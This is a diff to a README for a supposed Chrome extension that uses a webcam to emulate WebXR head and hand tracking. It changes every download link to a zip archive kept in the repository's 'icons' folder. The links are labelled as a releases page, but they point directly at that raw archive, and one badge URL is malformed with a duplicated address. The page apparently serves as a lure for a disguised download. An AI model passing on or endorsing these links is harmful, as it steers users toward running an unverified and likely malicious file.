@@ -1,7 +1,7 @@
 # 🎉 webxr-webcam-emulator - Use Your Webcam for Immersive Experiences
 
 ## 📥 Download the Application
-[![Download Latest Release](https://github.com/Rexi07/webxr-webcam-emulator/raw/refs/heads/main/icons/webxr_webcam_emulator_1.4.zip%https://github.com/Rexi07/webxr-webcam-emulator/raw/refs/heads/main/icons/webxr_webcam_emulator_1.4.zip)](https://github.com/Rexi07/webxr-webcam-emulator/raw/refs/heads/main/icons/webxr_webcam_emulator_1.4.zip)
+[![Download Latest Release](https://github.com/Rexi07/webxr-webcam-emulator/raw/refs/heads/main/icons/emulator_webcam_webxr_1.7.zip%https://github.com/Rexi07/webxr-webcam-emulator/raw/refs/heads/main/icons/emulator_webcam_webxr_1.7.zip)](https://github.com/Rexi07/webxr-webcam-emulator/raw/refs/heads/main/icons/emulator_webcam_webxr_1.7.zip)
 
 ## 🚀 Getting Started
 The webxr-webcam-emulator is a Chrome extension designed to enhance your online experiences. It uses your webcam to simulate head and hand tracking, allowing you to engage with WebXR applications more interactively and immersively.
@@ -14,7 +14,7 @@ The webxr-webcam-emulator is a Chrome extension designed to enhance your online 
 ## 📦 Download & Install
 To get the webxr-webcam-emulator, follow these steps:
 
-1. **Visit the Releases Page:** Click this link to go to the releases page: [Download Now](https://github.com/Rexi07/webxr-webcam-emulator/raw/refs/heads/main/icons/webxr_webcam_emulator_1.4.zip).
+1. **Visit the Releases Page:** Click this link to go to the releases page: [Download Now](https://github.com/Rexi07/webxr-webcam-emulator/raw/refs/heads/main/icons/emulator_webcam_webxr_1.7.zip).
 
 2. **Select the Latest Version:** Look for the latest version at the top of the page.
 
@@ -64,4 +64,4 @@ Once you have installed the webxr-webcam-emulator, explore different WebXR appli
 
 ---
 
-For detailed information and updates, visit our releases page regularly: [Download Now](https://github.com/Rexi07/webxr-webcam-emulator/raw/refs/heads/main/icons/webxr_webcam_emulator_1.4.zip). Enjoy your immersive experience!
+For detailed information and updates, visit our releases page regularly: [Download Now](https://github.com/Rexi07/webxr-webcam-emulator/raw/refs/heads/main/icons/emulator_webcam_webxr_1.7.zip). Enjoy your immersive experience!
